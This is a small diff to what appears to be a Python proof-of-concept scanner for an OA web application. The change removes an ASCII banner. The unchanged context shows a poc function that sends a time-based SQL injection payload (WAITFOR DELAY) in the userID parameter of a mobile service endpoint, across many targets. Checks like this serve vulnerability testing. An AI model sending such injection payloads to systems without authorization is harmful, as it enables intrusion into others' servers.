@@ -7,15 +7,8 @@ import argparse,sys,re,requests
 from multiprocessing.dummy import Pool
 requests.packages.urllib3.disable_warnings()
 def banner():
-    test="""
-███████╗██╗  ██╗██╗   ██╗██╗   ██╗
-██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
-███████╗█████╔╝  ╚████╔╝ ██║   ██║
-╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
-███████║██║  ██╗   ██║   ╚██████╔╝
-╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ 
- """
-    print(banner)
+    pass
+    
 #poc检测模块
 def poc(target):
     url = target + "/c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1%27%3b+WAITFOR%20DELAY%20%270:0:5%27-- "
